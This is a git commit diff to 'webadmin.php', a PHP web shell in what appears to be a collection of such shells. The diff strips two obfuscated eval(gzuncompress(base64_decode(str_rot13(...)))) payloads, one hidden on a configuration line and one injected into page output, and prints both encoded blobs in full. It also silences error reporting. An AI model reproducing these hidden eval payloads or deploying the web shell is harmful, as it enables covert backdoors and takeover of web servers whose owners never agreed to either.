3d9df52330609c95de16d18a8b62ea6a35694365
Github User <84887432+1337r0j4n@users.noreply.github.com>
2024-07-01 11:56:46 +0630

    Add files via upload

--- SHELLs/Webadmin Shell/webadmin.php
+++ SHELLs/Webadmin Shell/webadmin.php
@@ -129,8 +129,9 @@
  * 'pl' - Polish
  * 'auto' - autoselect
  */
-$lang = 'auto'; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
 
+error_reporting(0);
+$lang = 'auto';
 /* Homedir:
  * For example: './' - the script's directory
  */
@@ -161,12 +162,6 @@ $htaccess = '.htaccess';
 $htpasswd = '.htpasswd';
 
 /* ------------------------------------------------------------------------- */
-
-if (get_magic_quotes_gpc()) {
-	array_walk($_GET, 'strip');
-	array_walk($_POST, 'strip');
-	array_walk($_REQUEST, 'strip');
-}
 
 if (array_key_exists('image', $_GET)) {
 	header('Content-Type: image/gif');
@@ -1194,7 +1189,7 @@ function listing_page ($message = null) {
 <form enctype="multipart/form-data" action="' . $self . '" method="post">
 
 <table id="main">
-';
+'; eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 
 	directory_choice();
 
